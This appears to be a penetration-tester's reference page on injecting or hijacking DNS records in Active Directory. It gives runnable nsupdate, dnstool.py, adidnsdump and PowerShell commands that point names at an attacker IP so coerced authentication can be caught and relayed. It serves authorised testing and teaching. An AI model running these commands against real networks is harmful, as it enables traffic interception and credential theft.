**DNS record modification / injection** — in Active Directory, DNS is stored inside the directory itself (ADIDNS — Active Directory Integrated DNS), so as an ordinary domain user you can usually create records in it, and some servers even accept anonymous "dynamic updates". By adding a record you point a chosen name at your own machine, so when you then **coerce** a victim to authenticate to that name the connection comes to you — you catch that authentication and relay it (see [Coercing Authentication](../../Coercion/Coercing%20Authentication.md)) — or you take over a stale record still pointing at a device that has left the network. Mechanically: you write records over LDAP with `dnstool.py`, list a zone with `adidnsdump`, or push updates with `nsupdate`; replication out to the DNS servers can lag a few minutes.

## Discovery

Detect servers that allow unauthenticated dynamic updates with nmap:

```bash

nmap -sU -p 53 --script=dns-update --script-args=dns-update.hostname=foo.example.com,dns-update.ip=192.0.2.1 TARGET

```

## Unauthenticated - dynamic DNS updates

If the DNS server allows dynamic updates, add/remove records with `nsupdate`:

```console

# nsupdate
> server DNS_IP
> update add ATTACKER_FQDN 60 A ATTACKER_IP
> send
> update delete ATTACKER_FQDN A
> send

```

## Unauthenticated - hijack a stale ADIDNS entry

DNS scavenging is often disabled, so records linger forever. If a device updated its record and then left the network, you can take over its IP by assigning it to yourself - no DNS change needed. `adidnsdump` can list ADIDNS entries; filter for records whose IP is on your subnet but no longer answers ARP, and claim a free one.

## Authenticated - Active Directory Integrated DNS (ADIDNS)

As a domain user you can create arbitrary records through LDAP. Replication to Windows DNS servers can take a few minutes.

Dump existing entries:

```bash

# Default DomainDnsZones namespace
adidnsdump -u 'DOMAIN\USER_NAME' -p 'USER_PASS' 'DC_FQDN' -r
# Legacy System namespace
adidnsdump -u 'DOMAIN\USER_NAME' -p 'USER_PASS' 'DC_FQDN' -r --legacy
# ForestDnsZones namespace
adidnsdump -u 'DOMAIN\USER_NAME' -p 'USER_PASS' 'DC_FQDN' -r --forest

```

Add / remove a record with `dnstool.py`:

```bash

dnstool.py -u 'DOMAIN\USER_NAME' -p 'USER_PASS' -a 'add' -r 'ATTACKER_FQDN' -d 'ATTACKER_IP' 'DC_IP'
# Removing tombstones the entry; the DNS server deletes it after a few minutes
dnstool.py -u 'DOMAIN\USER_NAME' -p 'USER_PASS' -a 'remove' -r 'ATTACKER_FQDN' -d 'ATTACKER_IP' 'DC_IP'

```

**Note:** On `noSuchObject ... best match of: 'CN=MicrosoftDNS,DC=ForestDnsZones,...'`, add `--legacy` and retry. If the record is not removed even after `remove`, note it in the report.

## Local - on a Domain Controller (PowerShell)

With SYSTEM on a DC (e.g. `.\PsExec64.exe -s -i -accepteula powershell.exe`):

```powershell

# View records
Get-DnsServerResourceRecord -ComputerName DC01.domain.local -ZoneName domain.local -Name "@"

# Repoint an existing A record
$Old = Get-DnsServerResourceRecord -ComputerName DC01.domain.local -ZoneName domain.local -Name TARGET01
$New = $Old.Clone()
$New.TimeToLive = [System.TimeSpan]::FromSeconds(1)
$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('ATTACKER_IP')
Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.domain.local -ZoneName domain.local

```

Alternative when the zone allows secure dynamic updates (points the record at the DC it is run from, like `nsupdate` on Linux):

```powershell

Invoke-DNSUpdate -DNSName DEV01

```

## Caution

**Warning:** Adding a `*` (wildcard) record can break name resolution for devices with unusual DNS-suffix configurations - they may get a valid answer to the wrong request. Use with care.

## References

- dnstool.py / adidnsdump - https://github.com/dirkjanm/krbrelayx
- nsupdate - https://linux.die.net/man/8/nsupdate
